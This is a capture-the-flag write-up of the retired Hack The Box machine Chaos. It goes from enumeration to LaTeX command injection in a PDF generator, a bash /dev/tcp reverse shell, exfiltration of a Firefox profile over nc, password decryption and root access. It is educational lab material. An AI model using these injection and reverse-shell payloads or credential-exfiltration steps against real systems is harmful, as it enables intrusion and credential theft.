# Chaos

This is the write-up for the box Chaos that got retired at the 25th May 2019.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.120    chaos.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/chaos.nmap 10.10.10.120
```

```markdown
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL STLS TOP CAPA RESP-CODES PIPELINING UIDL AUTH-RESP-CODE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: OK more post-login have listed ID LOGIN-REFERRALS IDLE LITERAL+ capabilities LOGINDISABLEDA0001 Pre-login SASL-IR STARTTLS IMAP4rev1 ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: OK more have post-login ID LOGIN-REFERRALS IDLE listed capabilities Pre-login AUTH=PLAINA0001 SASL-IR IMAP4rev1 LITERAL+ ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP CAPA RESP-CODES PIPELINING UIDL AUTH-RESP-CODE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

Browsing to the web page we get a message saying:
> Direct IP not allowed

So there could be another page when we browse there with the domain name _chaos.htb_.
When browsing there we get a different page and after clicking every link and trying everything on the page, this looks like it has no attack surface but we get one information:

> Thanks for visiting :) we are working on blog

Lets start _Gobuster_ to look for hidden paths:
```markdown
gobuster -u http://10.10.10.120/ dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

We get the path _/wp_ from which we were can browse to a WordPress page with an article that is password protected.

![WordPress page](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_wp-page.png)

When seeing a WordPress page the first thing to do is to start **Nikto and **WPScan** to look for vulnerabilities and potential usernames:
```markdown
wpscan --enumerate --url 10.10.10.120/wp/wordpress

nikto -host 10.10.10.120/wp/wordpress
```

We get a username named _human_. Trying this username on the password protected article, we can read that article and it says:
```markdown
Creds for webmail :

username – ayush

password – jiujitsu
```

Those are seemingly credentials for a webmail service.


## Checking IMAP (Port 143)

As we know that IMAP is open on port 143 we will try to login there with the gained credentials.
```markdown
ncat 10.10.10.120 143

 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
TestA001 login ayush jiujitsu
* BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
TestA001 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

It says that non-secure connections are not allowed so we will connect to the SSL implemtation of IMAP on port 993.
```markdown
ncat --ssl 10.10.10.120 993

* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
TestA001 login ayush jiujitsu
TestA001 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```

This verifies that the credentials work so we can set up a mail client where we can look if this user has e-mail.
I will use the mail client **Evolution** and configure it accordingly to access the mailbox of _ayush_:

![Mailbox of user](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_mailbox.png)

There is this one e-mail with two attachments:
- enim_msg.txt
  - file: data; non-readable characters
- en.py
  - A python script that encrypts files
  
We need to modify the encryption script to decrypt the given file with the password _sahay_ because he hints that in the e-mail. The modified script will be found in this folder named **chaos_encrypt.py**.

```markdown
python chaos_encrypt.py

Output:
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
```

This is a Base64 string that we can decode:
```markdown
echo "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d
```

It says:
```markdown
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Browsing to the web page we get a service that seems to generate PDF files.

![PDF Generator](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_pdf-creator.png)

## Exploiting the PDF-Generator service

When clicking on _Create PDF_ nothing happens, so lets analyze the request in Burpsuite.
The response of the server says:
> This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)

PdfTex is part of a data formatting language called **LaTeX** and if we search for **LaTeX command execution** we will find different sources.
I will use the Cheat Sheets from [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).

The command execution _\immediate\write18{cat /etc/passwd}_ works and gives us the output from that file:

![Command execution successful](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_rce.png)

So we can execute commands to start a reverse shell. I will use this command that listens on my IP and port 9001:
```markdown
bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'

# URL-encoded in the request:
content=\immediate\write18{bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.9/9001+0>%261'}&template=test1
```

After sending the request we get a shell with the user _www-data_!

## Privilege Escalation

We can get the password for WordPress from the the file _wp-config.php_ in this path:
> /var/www/html/wp/wordpress/wp-config.php

The credentials we get are:
```markdown
/* MySQL database username */                 
define('DB_USER', 'roundcube');
                                                   
/* MySQL database password */
define('DB_PASSWORD', 'inner[OnCag8');
```

When we try the password from _ayush_ that we gained earlier from WordPress we can change from the www-data user to his.
Soon we realize that no commands work because his user is in a restriced shell, that we can verify by outputting the environment variable:
```markdown
echo $PATH

# Output
/home/ayush/.app
```

In this directory we find three commands that _ayush_ can execute: 
- dir
- ping
- tar

We either can look on [GTFOBins](https://gtfobins.github.io/) and escape the restricted shell with the `tar` command or by executing `export PATH=/bin` to execute all commands.

Now we can print the contents of his home folder and see a _.mozilla_ folder in which we can find stored password from Firefox in the from the profile **/home/ayush/.mozilla/firefox/bzo7sjt1.default** with the tool [firefox_decrypt](https://github.com/unode/firefox_decrypt).

Downloading the folder to our local machine:
```markdown
# On box
tar -zcvf /dev/shm/.mozilla.tar.gz .mozilla
nc 10.10.14.9 9002 < /dev/shm/.mozilla.tar.gz

# On our machine:
nc -lvnp 9002 > mozilla.tar.gz
tar zxvf mozilla.tar.gz
```

Executing that script in that directory and using the same password from _ayush_ again:
```markdown
python firefox_decrypt.py /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/
```
```markdown
Master Password for profile /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/: 

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```

These credentials work for the **Webmin** service that runs on port 10000 from where we can start a webshell.
The password also works for the root user if we just change to him via `su`!
